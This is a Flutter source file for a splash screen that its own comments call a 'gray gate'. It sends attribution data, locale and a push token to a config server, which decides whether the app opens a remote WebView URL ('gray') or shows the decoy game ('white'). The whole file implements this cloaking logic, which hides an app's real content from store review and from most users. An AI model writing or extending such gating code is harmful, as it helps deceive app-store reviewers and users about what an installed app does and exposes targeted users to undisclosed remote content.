import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:video_player/video_player.dart';

import '../../screens/main_menu_screen.dart';
import '../infra/gate_dispatch.dart';
import '../infra/pulse_relay.dart';
import '../infra/reach_probe.dart';
import '../infra/session_vault.dart';
import '../infra/tracking_signal.dart';
import '../models/session_mode.dart';
import 'content_browser.dart';
import 'no_signal_screen.dart';
import 'permit_screen.dart';

enum _BarStep { empty, midway, done }

/// ★ Core gray gate screen. Shows the loading splash video while running
/// the attribution + config pipeline, then routes to either WebView (gray)
/// or the existing game (white).
///
/// Flow:
///   fresh → network check → AppsFlyer warmup → POST config → web or game
///   web   → fast refresh → web (or game if server says no)
///   game  → optional re-attempt → game
class SplashGate extends StatefulWidget {
  final SessionVault vault;
  final ReachProbe probe;
  final TrackingSignal signal;
  final GateDispatch dispatch;
  final PulseRelay pulse;

  const SplashGate({
    super.key,
    required this.vault,
    required this.probe,
    required this.signal,
    required this.dispatch,
    required this.pulse,
  });

  @override
  State<SplashGate> createState() => _SplashGateState();
}

class _SplashGateState extends State<SplashGate> {
  VideoPlayerController? _vid;
  bool _vidReady = false;
  _BarStep _bar = _BarStep.empty;
  bool _navigated = false;
  Orientation? _lastOrientation;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp, DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft, DeviceOrientation.landscapeRight,
    ]);
    _boot();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final o = MediaQuery.of(context).orientation;
    if (o != _lastOrientation) { _lastOrientation = o; _switchVideo(o); }
  }

  Future<void> _switchVideo(Orientation o) async {
    final asset = o == Orientation.landscape
        ? 'assets/Loading/Horizontal_Loading_Screen.mp4'
        : 'assets/Loading/Vertical_Loading_Screen.mp4';
    final old = _vid;
    final ctrl = VideoPlayerController.asset(asset);
    try {
      await ctrl.initialize();
      ctrl.setLooping(true);
      ctrl.setVolume(0);
      ctrl.play();
      if (!mounted) { ctrl.dispose(); return; }
      setState(() { _vid = ctrl; _vidReady = true; });
      old?.dispose();
    } catch (_) {
      ctrl.dispose();
    }
  }

  void _setBar(_BarStep s) { if (mounted) setState(() => _bar = s); }

  Future<void> _boot() async {
    widget.pulse.onTokenRefresh = _onTokenRefresh;

    _setBar(_BarStep.empty);
    final mode = widget.vault.readMode();

    switch (mode) {
      case SessionMode.web:
        _setBar(_BarStep.midway);
        final pushFuture = widget.pulse.bootstrap().catchError((_) {});
        await _handleWebMode(pushFuture: pushFuture);
        break;
      case SessionMode.game:
        _setBar(_BarStep.midway);
        unawaited(widget.pulse.bootstrap().catchError((_) {}));
        final recovered = await _tryRecoverWebMode();
        if (recovered) return;
        _setBar(_BarStep.done);
        await Future.delayed(const Duration(milliseconds: 600));
        _goGame();
        break;
      case SessionMode.fresh:
        await widget.pulse.bootstrap().catchError((_) {});
        await _handleFreshMode();
        break;
    }
  }

  @override
  void dispose() {
    widget.pulse.onTokenRefresh = null;
    _vid?.dispose();
    super.dispose();
  }

  void _onTokenRefresh(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal.buildPayload(
      locale: locale, pushToken: token,
    );
    widget.dispatch.send(body);
  }

  Future<void> _handleFreshMode() async {
    _setBar(_BarStep.empty);
    final online = await widget.probe.isOnline();
    if (!online) { if (mounted) _goOffline(fresh: true); return; }

    _setBar(_BarStep.midway);
    await widget.signal.warmup();
    await Future.wait([
      widget.signal.awaitConversion(),
      widget.signal.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal.buildPayload(
      locale: locale, pushToken: widget.pulse.token,
    );
    final reply = await widget.dispatch.send(body);

    if (reply.granted && reply.destination != null) {
      await widget.vault.writeMode(SessionMode.web);
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goContent(reply.destination!);
    } else {
      await widget.vault.writeMode(SessionMode.game);
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goGame();
    }
  }

  Future<void> _handleWebMode({Future<void>? pushFuture}) async {
    final netFuture = widget.probe.isOnline();
    if (pushFuture != null) await Future.wait([netFuture, pushFuture]);
    final online = await netFuture;

    if (!online) {
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goOffline(fresh: false);
      return;
    }

    final oneShotUrl = await widget.vault.consumeOneShotUrl();
    if (oneShotUrl != null) {
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goContent(oneShotUrl);
      return;
    }

    final signalFuture = widget.signal.warmup();
    final savedUrl = await widget.vault.readSavedUrl();
    await signalFuture;
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 5)),
      widget.signal.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal.buildPayload(
      locale: locale, pushToken: widget.pulse.token,
    );
    final reply = await widget.dispatch.send(body);

    _setBar(_BarStep.done);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (reply.granted && reply.destination != null) {
      _goContent(reply.destination!);
      return;
    }
    if (savedUrl != null) {
      _goContent(savedUrl);
    } else {
      _goOffline(fresh: false);
    }
  }

  Future<bool> _tryRecoverWebMode() async {
    final online = await widget.probe.isOnline();
    if (!online) return false;
    await widget.signal.warmup();
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 8)),
      widget.signal.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal.buildPayload(
      locale: locale, pushToken: widget.pulse.token,
    );
    final reply = await widget.dispatch.send(body);
    if (!(reply.granted && reply.destination != null)) return false;
    await widget.vault.writeMode(SessionMode.web);
    _setBar(_BarStep.done);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return true;
    _goContent(reply.destination!);
    return true;
  }

  void _goContent(String url) {
    if (_navigated) return;
    _navigated = true;
    if (widget.vault.needsPushPrompt()) {
      widget.pulse.shouldOfferConsent().then((canAsk) {
        if (!mounted) return;
        if (canAsk) {
          Navigator.of(context).pushReplacement(MaterialPageRoute(
            builder: (_) => PermitScreen(
              vault: widget.vault,
              pulse: widget.pulse,
              probe: widget.probe,
              destination: url,
              onTokenReady: (token) async {
                final locale = Platform.localeName.replaceAll('-', '_');
                final body = await widget.signal.buildPayload(
                  locale: locale, pushToken: token,
                );
                widget.dispatch.send(body);
              },
            ),
          ));
        } else {
          _directBrowser(url);
        }
      });
    } else {
      _directBrowser(url);
    }
  }

  void _directBrowser(String url) {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => ContentBrowser(
        destination: url,
        vault: widget.vault,
        pulse: widget.pulse,
        probe: widget.probe,
      ),
    ));
  }

  void _goGame() {
    if (_navigated) return;
    _navigated = true;
    // Skip LoadingScreen — SplashGate already serves as the loading experience.
    // Going to MainMenuScreen directly avoids a double loading screen.
    // GameState and AudioService are initialised in main() before runApp.
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const MainMenuScreen()),
    );
  }

  void _goOffline({required bool fresh}) {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => NoSignalScreen(
        probe: widget.probe,
        retryBuilder: (_) => SplashGate(
          vault: widget.vault,
          probe: widget.probe,
          signal: widget.signal,
          dispatch: widget.dispatch,
          pulse: widget.pulse,
        ),
      ),
    ));
  }

  String _barAsset() {
    switch (_bar) {
      case _BarStep.empty:  return 'assets/Loading/Loading_Bar_Empty.webp';
      case _BarStep.midway: return 'assets/Loading/Loading_Bar_Half.webp';
      case _BarStep.done:   return 'assets/Loading/Loading_Bar_Full.webp';
    }
  }

  @override
  Widget build(BuildContext context) {
    final barAsset = _barAsset();
    final mq = MediaQuery.of(context);
    final landscape = mq.orientation == Orientation.landscape;
    final barW = landscape
        ? (mq.size.height * 0.35).clamp(0.0, 160.0)
        : (mq.size.width * 0.70).clamp(0.0, 340.0);

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          const ColoredBox(color: Colors.black),
          AnimatedOpacity(
            opacity: _vidReady ? 1.0 : 0.0,
            duration: const Duration(milliseconds: 400),
            child: _vid != null && _vidReady
                ? SizedBox.expand(
                    child: FittedBox(
                      fit: BoxFit.cover,
                      child: SizedBox(
                        width: _vid!.value.size.width,
                        height: _vid!.value.size.height,
                        child: VideoPlayer(_vid!),
                      ),
                    ),
                  )
                : const SizedBox.shrink(),
          ),
          if (_vidReady)
            Positioned(
              left: 0, right: 0,
              bottom: landscape ? 0 : mq.padding.bottom,
              child: Center(
                child: AnimatedSwitcher(
                  duration: const Duration(milliseconds: 300),
                  child: Image.asset(
                    barAsset,
                    key: ValueKey(barAsset),
                    width: barW,
                    fit: BoxFit.contain,
                    gaplessPlayback: true,
                    errorBuilder: (ctx, e, st) => const SizedBox(height: 32),
                  ),
                ),
              ),
            ),
        ],
      ),
    );
  }
}
